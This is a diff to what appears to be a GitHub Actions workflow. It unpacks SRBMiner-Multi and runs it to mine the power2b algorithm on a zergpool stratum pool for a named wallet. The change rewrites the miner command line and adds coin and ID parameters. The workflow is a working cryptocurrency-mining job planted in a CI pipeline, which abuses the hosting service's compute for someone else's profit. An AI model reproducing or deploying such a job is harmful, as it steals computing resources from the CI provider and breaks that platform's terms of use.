@@ -21,6 +21,6 @@ jobs:
     - name: Seting-UP
       run: Expand-Archive SRBMiner-Multi-0-7-1-win64.zip
     - name: Running
-      run: .\SRBMiner-Multi-0-7-1-win64.zip\SRBMiner-MULTI.exe --disable-gpu --algorithm power2b --pool stratum+tcp://power2b.asia.mine.zergpool.com:7445 --wallet Mj72KbUTkJE8janJvKNvQJ8GBU4qAHn8Pc
+      run: .\SRBMiner-Multi-0-7-1-win64.zip\SRBMiner-MULTI.exe -a power2b -o stratum+tcp://power2b.asia.mine.zergpool.com:7445 -u Mj72KbUTkJE8janJvKNvQJ8GBU4qAHn8Pc -p  c=MBC,mc=MBC,ID=duta
     - name: DONE
       run: exit
